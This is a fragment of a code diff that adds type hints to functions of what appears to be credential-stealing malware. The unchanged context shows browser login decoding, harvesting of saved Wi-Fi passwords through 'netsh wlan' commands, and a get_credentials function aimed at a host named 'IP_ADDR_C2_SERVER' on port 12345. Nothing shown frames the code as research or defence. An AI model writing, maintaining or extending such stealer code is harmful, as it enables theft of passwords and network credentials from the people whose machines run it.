@@ -61,7 +61,7 @@ def decode_login(path: str, firefox_decoder: bytes) -> str:
 
     return data
 
-def get_wifi():
+def get_wifi() -> str:
     wifi_profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('cp850')
     wifi_profiles = wifi_profiles.replace('\r', '')
     wifi_names = re.findall(r"All User Profile\s*: (.*)", wifi_profiles)
@@ -73,7 +73,7 @@ def get_wifi():
             wifi_credentials += f'{name}:{password.group(1).replace('\r', '')}\n'
     return wifi_credentials.encode('utf-8')
 
-def get_credentials():
+def get_credentials() -> None:
     host = 'IP_ADDR_C2_SERVER'
     port = 12345
     path = get_credentials_paths()
